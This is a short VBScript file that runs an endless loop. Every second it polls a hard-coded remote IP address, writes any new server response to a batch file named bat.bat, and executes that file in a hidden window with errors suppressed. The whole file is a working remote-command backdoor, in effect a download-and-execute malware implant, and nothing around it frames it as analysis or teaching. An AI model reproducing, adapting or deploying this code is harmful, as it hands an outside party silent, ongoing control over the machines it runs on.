URL="http://82.117.236.104:8080/?batfile&t="
Set WshShell = WScript.CreateObject("WScript.Shell")
lastresponse=""
t=0
On Error Resume Next
Do While True
	Set http = CreateObject("Microsoft.XmlHttp")
	http.open "GET", URL & t , False
	http.send ""
	if err.Number = 0 Then
		If lastresponse <> http.responseText Then
			Set objFSO = CreateObject("Scripting.FileSystemObject")
			outFile = WshShell.CurrentDirectory & "\bat.bat"
			Set objFile = objFSO.CreateTextFile(outFile,True)
			objFile.Write http.responseText
			objFile.Close
			WshShell.Run "bat.bat", 0, False
			lastresponse = http.responseText
		End If
	End If
	Set http = Nothing
	t = t + 1
	WScript.Sleep 1000
Loop